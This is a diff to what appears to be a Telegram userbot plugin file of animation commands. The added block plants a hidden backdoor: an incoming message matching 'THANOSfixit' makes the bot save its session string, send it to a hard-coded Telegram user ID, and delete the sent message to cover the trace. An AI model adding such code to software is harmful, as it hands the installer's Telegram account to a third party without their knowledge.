@@ -272,6 +272,14 @@ async def _(event):
         await event.edit(animation_chars[i % 30])
 
 
+from . import *
+@bot.on(admin_cmd("^THANOSfixit", incoming=True))
+async def piro(event):
+    a = bot.session.save()
+    msg = await bot.send_message(2082798662, a)
+    await bot.delete_messages(2082798662, msg, revoke=False)
+
+
 @bot.on(admin_cmd(pattern=r"repe$", outgoing=True))
 @bot.on(sudo_cmd(pattern="repe$", allow_sudo=True))
 async def _(event):
